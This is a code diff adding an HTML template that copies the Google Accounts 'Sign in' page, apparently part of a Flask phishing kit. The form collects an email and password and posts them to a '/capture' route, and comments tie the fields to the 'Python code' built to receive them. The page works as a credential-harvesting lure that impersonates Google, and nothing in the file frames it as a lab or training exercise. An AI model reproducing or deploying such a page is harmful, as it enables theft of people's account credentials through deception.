@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=net?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-box {
+            width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-family: 'Google Sans', sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        p {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 40px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border 0.2px, box-shadow 0.2px;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* prevent jump on border change */
+        }
+
+        .forgot-link {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: left;
+            margin-bottom: 40px;
+        }
+
+        .footer-btns {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-next:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+        }
+
+        @media (max-width: 450px) {
+            .login-box {
+                border: none;
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <!-- Google Logo SVG -->
+    <img src="{{ url_for('static', filename='images.png') }}" class="logo" alt="Google Logo">
+
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+
+    <!-- ACTION POINT: Points to the Flask route we built -->
+    <form action="/capture" method="POST">
+        <div class="input-container">
+            <!-- name="email" matches the Python code -->
+            <input type="text" name="email" placeholder="Email or phone" required>
+        </div>
+
+        <div class="input-container">
+            <!-- name="pass" matches the Python code -->
+            <input type="password" name="pass" placeholder="Enter your password" required>
+        </div>
+
+        <a href="#" class="forgot-link">Forgot email?</a>
+
+        <div class="footer-btns">
+            <span style="color: #1a73e8; font-weight: 500; cursor: pointer;">Create account</span>
+            <button type="submit" class="btn-next">Next</button>
+        </div>
+    </form>
+</div>
+
+</body>
+</html>
